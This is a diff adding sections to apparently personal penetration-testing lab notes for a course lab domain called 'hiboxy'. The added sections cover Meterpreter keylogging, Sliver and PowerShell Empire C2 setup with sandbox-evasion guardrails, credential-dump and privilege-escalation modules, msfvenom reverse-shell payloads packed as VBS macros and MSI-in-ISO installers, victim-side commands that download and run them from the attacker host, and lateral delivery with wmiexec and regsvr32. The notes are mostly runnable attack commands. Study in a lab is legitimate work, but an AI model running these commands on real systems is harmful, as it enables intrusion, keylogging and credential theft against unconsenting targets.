@@ -38,26 +38,223 @@ hydra -L /tmp/domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.4 smb
 
 ===================================================================}}}
 
-{{{ Section: X ================================================================
+{{{ Section: Metasploit ================================================================
+
+# migrate 
+ps -S explorer.exe // search
+migrate <pid>
+getpid
+keyscan_start // keylog
+keyscan_dump
+keyscan_stop 
+===================================================================}}}
+
+{{{ Section: C2 - Sliver ================================================================
+
+// for sake of lab/time, -l or --skip-symbols to save time 
+
+// server setup
+sudo sliver-server
+help
+multiplayer 
+        configure and add new users (operator or player) so you can work together as a team.
+
+// config operator 
+new-operator -h
+new-operator -n zerocool -s /tmp/ -l 10.254.252.29 // hosts a webserver at 443
+ls -l /tmp/*.cfg // share with player 
+sudo chown sec560:sec560 /tmp/*.cfg
+
+// log in as client/player
+sliver-client -h 
+sliver-client import /tmp/zerocool_10.254.252.29.cfg
+sliver-client 
+
+\\ create listener & implant payload 
+https -h 
+        // real world would create a cert (Let's Encrypt) and set up a domain 
+jobs
+
+
+// guardrails - bypass sandbox technology
+    -w, --limit-datetime: limit execution to before datetime (similar to KillDate in Empire)
+    -x, --limit-domainjoined: limit execution to domain joined machines
+    -F, --limit-fileexists: limit execution to hosts with this file in the filesystem
+    -z, --limit-hostname: limit execution to specified hostname
+    -y, --limit-username: limit execution to specified username
+-c, --canary // canary domain! included in executable 
+
+// gen payload - skip obfuscation for time 
+generate --os windows --skip-symbols --name first --http 10.254.252.29
+implants
+
+- deliver payload 
+- session received 
+use <id> // (can enter first 2 digits)
+
+// enum
+getuid
+getgid
+
+whoami
+info 
+shell // bad OPSEC
+
+
+\\ Execute Assembly - SharpWMI
+execute-assembly /home/sec560/labs/SharpWMI.exe // executes in memory!
 
 
 
 ===================================================================}}}
 
-{{{ Section: X ================================================================
+{{{ Section: C2 - Powershell Empire ================================================================
+
+// server setup
+sudo ./ps-empire server
 
 
+// client 
+sudo ./ps-empire client
+help
+
+// config listener 
+listeners
+help
+back
+
+uselistener
+uselistener http
+
+\\ intrsting options
+    KillDate - after which time the listener will stop listening
+    StagingKey - A pseudo-random StagingKey for encrypting communications between agent and listener
+    WorkingHours - to limit the time when agents will actively call back to the listener
+    DefaultDelay - agents r asynchronous and DefaultDelay specifies how often the agent will check in
+       
+set DefaultDelay 1
+set Port 9999
+set Host http://10.254.252.29:9999
+options
+execute
+
+// Deploy agent 
+usestager
+usestager windows/launcher_bat // runs powershell via .bat then deletes .bat, ol reliable 
+set Listener http
+generate
+
+cd /opt/empire/empire/client/generated-stagers/
+python3 -m http.server
+
+// download via powershell on win tgt
+        wget http://10.254.252.29:8000/launcher.bat -OutFile launcher.bat
+        Get-Content launcher.bat // view file 
+        launch
+
+// C2
+agents
+rename <agentID> agent1
+interact agent1
+info 
+
+
+// Modules - enum
+usemodule
+usemodule powershell/situational_awareness/host/winenum
+execute
+view 1 
+
+// privesc enum
+usemodule powerup \\ DONT ENTER, just view options 
+usemodule powershell/privesc/powerup/allchecks 
+execute 
+view 2
+
+// creds dump
+usemodule powershell/credentials/powerdump
+execute \\ wont work, needs elevated privs 
+
+// ask - ask user to run X -- PRIVESC 
+usemodule powershell/privesc/ask
+set Listener http
+execute
+
+rename A89E5YUP priv1
+list 
+usemodule powershell/credentials/powerdump
+execute 
+
+// run commands
+shell ipconfig
+
+// Port Scan
+usemodule powershell/situational_awareness/network/portscan
+set Hosts 10.130.10.10
+execute
+
+// Shut down agents 
+agents
+kill all
+y
 
 ===================================================================}}}
 
-{{{ Section: X ================================================================
+{{{ Section: Payloads ================================================================
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 
+set LPORT 
+set ExitOnSession false
+run -j -z
+        // run as job, no interact with new connections
+
+// gemeratopm
+msfvenom --list formats
+
+// Office VBS macro 
+msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f vbs | tee /tmp/payload.vbs
+python3 -m http.server 
+
+\\ on victim
+powershell
+wget http://10.254.252.29:8000/payload.vbs -OutFile payload.vbs
+cscript payload.vbs // run with cscript 
+
+// MSI payload in ISO file 
+msfvenom -p windows/meterpreter/reverse_http lhost=eth0 lport=3333 -f msi -o /tmp/setup.msi // installer (payload)
+genisoimage -o /tmp/installer.iso /tmp/setup.msi // create ISO with it 
+
+\\ victim
+wget http://10.254.252.29:8000/installer.iso -OutFile installer.iso
 
 
 
-===================================================================}}}
+// SLIVER and C2 payloads
+sudo sliver-server
+https
 
-{{{ Section: X ================================================================
+generate -h
+generate --os windows --arch 64bit --format shared --skip-symbols --http https://10.254.252.29
 
+ls -l *.dll
+sudo chown sec560:sec560 *.dll
+sudo chown sec560:sec560 <NAME>.dll
+        sudo chown sec560:sec560 DISGUSTED_TURN.dll
+
+
+// transfer with Impacket SMBclient (to hiboxy)
+smbclient.py hiboxy/bgreen:Password1@10.130.10.25
+use c$
+put DISGUSTED_TURN.dll
+ls
+
+// execute payload with wmiexec.py
+wmiexec.py hiboxy/bgreen:Password1@10.130.10.25
+regsvr32 DISGUSTED_TURN.dll
+
+use <first 2 of sessID>
 
 
 ===================================================================}}}
